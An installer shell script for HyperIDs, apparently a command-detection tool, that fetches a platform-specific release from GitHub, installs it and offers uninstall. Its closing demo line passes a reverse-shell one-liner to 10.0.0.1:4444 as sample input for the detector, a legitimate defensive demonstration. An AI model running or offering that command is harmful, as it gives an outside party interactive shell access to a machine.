#!/bin/sh
# HyperIDs — one-shot installer for the Rust single-binary releases.
#
# Usage:
#   curl -fsSL https://github.com/ohmydevelop/hyperids/releases/latest/download/install.sh | sh
#   ./install.sh --prefix /usr/local
#   ./install.sh --version v1.6.0
set -e

REPO="ohmydevelop/hyperids"
DEFAULT_VERSION="v1.6.0"
BIN_NAME="hyperids"

OS="$(uname -s)"
ARCH="$(uname -m)"
case "$OS" in
  Darwin) OS_L="darwin" ;;
  Linux) OS_L="linux" ;;
  *) echo "unsupported OS: $OS" >&2; exit 2 ;;
esac
case "$ARCH" in
  x86_64|amd64) ARCH_L="x86_64" ;;
  arm64|aarch64) ARCH_L="aarch64" ;;
  *) echo "unsupported arch: $ARCH" >&2; exit 2 ;;
esac

VERSION="${VERSION:-$DEFAULT_VERSION}"
PREFIX_ARG=""
DO_UNINSTALL=0
while [ $# -gt 0 ]; do
  case "$1" in
    --uninstall|-u) DO_UNINSTALL=1 ;;
    --prefix) PREFIX_ARG="$2"; shift ;;
    --version) VERSION="$2"; shift ;;
    --help|-h) sed -n '2,20p' "$0"; exit 0 ;;
    *) echo "unknown arg: $1" >&2; exit 2 ;;
  esac
  shift
done

PREFIX="${PREFIX_ARG:-${PREFIX:-$HOME/.local}}"
BIN_DIR="$PREFIX/bin"
TARGET="$BIN_DIR/$BIN_NAME"
ASSET="hyperids-${OS_L}-${ARCH_L}.tar.gz"

if [ "$DO_UNINSTALL" = 1 ]; then
  for d in "$BIN_DIR" "$HOME/.local/bin" /usr/local/bin; do
    [ -e "$d/$BIN_NAME" ] && { echo "removing $d/$BIN_NAME"; rm -f "$d/$BIN_NAME"; }
    rm -f "$d"/libonnxruntime*.so "$d"/libonnxruntime*.dylib 2>/dev/null || true
  done
  echo "uninstalled."
  exit 0
fi

mkdir -p "$BIN_DIR"

LOCAL="$(dirname "$0")/$ASSET"
if [ -f "$LOCAL" ]; then
  echo "installing local $LOCAL -> $BIN_DIR"
  tar -xzf "$LOCAL" -C "$BIN_DIR"
else
  URL="https://github.com/$REPO/releases/download/$VERSION/$ASSET"
  tmp="$(mktemp -d)"
  downloaded=0
  if command -v curl >/dev/null 2>&1; then
    echo "downloading $URL"
    curl -fL --retry 3 -o "$tmp/$ASSET" "$URL" && downloaded=1
  fi
  if [ "$downloaded" != 1 ] && command -v gh >/dev/null 2>&1 && gh auth status >/dev/null 2>&1; then
    gh release download "$VERSION" -R "$REPO" -p "$ASSET" -O "$tmp/$ASSET" --clobber && downloaded=1
  fi
  if [ "$downloaded" != 1 ] && [ -n "${GITHUB_TOKEN:-}" ] && command -v curl >/dev/null 2>&1; then
    curl -fL --retry 3 -H "Authorization: token $GITHUB_TOKEN" -o "$tmp/$ASSET" "$URL" && downloaded=1
  fi
  [ "$downloaded" = 1 ] || { echo "download failed" >&2; exit 1; }
  echo "installing -> $BIN_DIR"
  tar -xzf "$tmp/$ASSET" -C "$BIN_DIR"
  rm -rf "$tmp"
fi

chmod 0755 "$BIN_DIR/$BIN_NAME"
for f in "$BIN_DIR"/libonnxruntime*; do
  [ -e "$f" ] && chmod 0755 "$f"
done

echo
echo "HyperIDs installed to $BIN_DIR"
case ":$PATH:" in
  *":$BIN_DIR:"*) ;;
  *) echo "NOTE: $BIN_DIR is not on your PATH."; echo "  add:  export PATH=\"$BIN_DIR:\$PATH\"" ;;
esac
echo
echo "Try it:"
echo "  hyperids 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
